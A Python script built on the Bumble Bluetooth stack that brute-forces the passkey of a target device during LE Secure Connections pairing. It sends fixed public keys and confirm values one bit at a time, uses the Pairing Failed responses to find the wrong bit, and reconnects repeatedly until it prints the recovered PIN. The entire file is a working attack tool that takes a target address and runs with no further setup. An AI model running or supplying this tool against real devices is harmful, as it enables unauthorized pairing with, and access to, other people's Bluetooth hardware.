import time
import asyncio
import logging
import argparse

from bumble.device import Device, DeviceConfiguration
from bumble.transport import open_transport
from bumble.hci import Address
from bumble.pairing import PairingDelegate

from Crypto.Hash import CMAC
from Crypto.Cipher import AES

SMP_CID = 0x0006

class Transport:
    def __init__(self):
        self.t = None
        self.device = None

    async def init(self):
        self.t = await open_transport("usb:0")
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "SMP Bruteforce"
        self.device = Device.from_config_with_hci(config, self.t.source, self.t.sink)
        self.device.le_enabled = True
        # We need this to signal the other device we can actually input a passkey
        self.device.config.io_capability = PairingDelegate.IoCapability.DISPLAY_OUTPUT_AND_KEYBOARD_INPUT
        await self.device.power_on()

    def register_raw_cid_handler(self, cid, cb):
        def on_smp_pdu(handle, pdu):
            if cb:
                cb(pdu, cid)
        # Set or replace handler with our own handler
        self.device.l2cap_channel_manager.register_fixed_channel(cid, on_smp_pdu)

    async def close(self):
        await self.t.close()
        await self.device.power_off()
class SMP:
    def __init__(self, connection, pin_bits):
        self.connection = connection
       
        # Pairing-related data
        self.pk_a = bytes.fromhex("4C746F9EFDBB5C49CCE450B682AE930441ABE3C63B850ACFDA94812DAC231268")
        self.pk_b = None
        # our random is always the same
        self.random = bytes.fromhex("AA"*16)

        self.bit_index = 0
        self.error_bit = None
        self.bits = pin_bits
        self.error = False

        self._setup_logging()

    def _setup_logging(self):
        self.log = logging.getLogger("smp_protocol")
        self.log.setLevel(logging.INFO)
        if not self.log.hasHandlers():
            fmt = logging.Formatter("\x1b[32m[SMP]\x1b[0m %(message)s")
            handler = logging.StreamHandler()
            handler.setFormatter(fmt)
            self.log.addHandler(handler)
            self.log.propagate = False

    # the f4 function from the Bluetooth specification "LE Secure Connections Confirm Value Generation Function f4"
    def f4(self, u, v, x, z):
        self.log.debug(f"f4({u.hex()}, {v.hex()}, {x.hex()}, {z})")
        c = CMAC.new(x, ciphermod=AES)
        c.update(u + v + z)
        return c.digest()

    def send(self, data):
        self.log.debug(f"[SMP SEND]: {data.hex()}")
        self.connection.send_l2cap_pdu(SMP_CID, data)

    def send_pk(self):
        # SMP Pairing Public Key Command (0x0c)
        # Public Key X: 0x4C746F9EFDBB5C49CCE450B682AE930441ABE3C63B850ACFDA94812DAC231268
        # Public Key Y: 0x997C99476F72FB9C65CF03AF94F10E534040F3A0B47DCDAF80A679034359D9B8
        pk_cmd = bytes.fromhex("0C681223AC2D8194DACF0A853BC6E3AB410493AE82B650E4CC495CBBFD9E6F744CB8D959430379A680AFCD7DB4A0F34040530EF194AF03CF659CFB726F47997C99")
        self.send(pk_cmd)

    def send_confirm(self):
        self.log.info(f"Sending SMP Pairing Confirm Command with bit {self.bit_index + 1}/20: {self.bits[self.bit_index]}")
        confirm_val = self.f4(self.pk_a, self.pk_b, self.random, bytearray([0x80 + self.bits[self.bit_index]]))
        self.send(b"\x03" + confirm_val[::-1])
        self.bit_index += 1

    def listener(self, data, cid):
        self.log.debug(f"[SMP RECV]: {data.hex()}")

        if data == b"\x0b\x0d":
            self.log.info("Received SMP Security Request")
            self.send(bytes.fromhex("0104000D100b0b"))
        elif data[0] == 0x01:
            self.log.info("Received SMP Pairing Request")
            self.send(b"\x02\x00\x00\x0d\x10\x01\x03")
        elif data[0] == 0x02:
            self.log.info("Received SMP Pairing Response")
            self.send_pk()
        elif data[0] == 0x03:
            self.log.debug("Received SMP Pairing Confirm Command")
            self.log.debug("Sending SMP Random Command")
            self.send(b"\x04" + self.random)
        elif data[0] == 0x04:
            self.log.debug("Received SMP Random Command")
            if self.bit_index < 20:
                self.send_confirm()
        elif data[0] == 0x05:
            if data[1] == 0x04:
                self.error_bit = self.bit_index - 1
                self.log.error(f"Error on bit at index {self.error_bit} = {self.bits[self.error_bit]}")
            else:
                self.log.error(f"Received SMP Pairing Failed Command with unhandled error {hex(data[1])}")
            self.error = True
        elif data[0] == 0x0c:
            self.log.info("Received SMP Pubkey Command")
            pk_x = data[1:33][::-1]
            pk_y = data[34:34+32][::-1]
            self.log.debug(f"PK_X: {pk_x.hex()}\nPK_Y: {pk_y.hex()}")
            self.pk_b = pk_x

            self.send_confirm()
        else:
            self.log.info("Received unknown SMP Command {binascii.hexlify(data)}")

class SMPBruteforce:
    def __init__(self, transport: Transport, target, guess=[]):
        self.transport = transport 
        self.target = target

        # if there's no guess we just set all bits to 0
        if len(guess) != 20:
            self.pin_bits = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        self._setup_logging()

        self.finished = False
        self.attempts = 0
        self.timer = None

    def _setup_logging(self):
        self.log = logging.getLogger("smp_bruteforce")
        if not self.log.hasHandlers():
            fmt = logging.Formatter("\x1b[37m[* SMP Bruteforce]\x1b[0m %(message)s")
            handler = logging.StreamHandler()
            handler.setFormatter(fmt)
            self.log.addHandler(handler)
            self.log.propagate = False
            self.log.setLevel(logging.INFO)

    async def bruteforce(self):
        self.log.info(f"Starting SMP bruteforce against {self.target}")
        self.timer = time.time()
        while not self.finished:
            # connect to the target
            connection = await self.transport.device.connect(self.target)
            if connection.handle:
                smp = SMP(connection, self.pin_bits)

                # listen to SMP CID
                # this essentially overwrites Bumble's SMP handling
                self.transport.register_raw_cid_handler(SMP_CID, smp.listener)

                # let SMP do its thing and obtain the failing index to flip the bit in our list
                while connection.handle and not smp.bit_index >= 20 and not smp.error:
                    await asyncio.sleep(0.1)

                if smp.error_bit != None:
                    if self.pin_bits[smp.error_bit] == 0:
                        self.pin_bits[smp.error_bit] = 1
                    else:
                        self.pin_bits[smp.error_bit] = 0

                self.log.info(f"Current bits: {self.pin_bits}")

                if smp.bit_index == 20:
                    self.finished = True
                    break

                await connection.disconnect()
                self.attempts += 1
            else:
                self.log.error(f"Unable to connect to device {self.target.hex()}. Trying again.")

        self.log.info(f"Bruteforcing finished. Took about {(time.time() - self.timer):.2f} seconds and required {self.attempts} connection attempts")
        pin = self.pin_bits_as_int()
        self.log.info("\x1b[31m->\x1b[0m The PIN is %d", pin)
        return pin

    def pin_bits_as_int(self):
        pin = 0
        for idx, val in enumerate(self.pin_bits):
            pin += val << idx
        return pin

def parse_args():
    parser = argparse.ArgumentParser(description="SMP Bruteforce")
    parser.add_argument("-c", "--controller", default="usb:0", help="Bumble Bluetooth Controller")
    parser.add_argument("--debug", action='store_true', help="Enable debug logging.")
    parser.add_argument("--target", required=True, help="Device address to connect to")
    
    return parser.parse_args()

async def main():

    args = parse_args()

    if args.debug:
        logging.basicConfig(level='DEBUG')

    target = args.target

    transport = Transport()
    await transport.init()

    smpbf = SMPBruteforce(transport, target)
    await smpbf.bruteforce()

    await transport.close()

if __name__ == "__main__":
    asyncio.run(main())
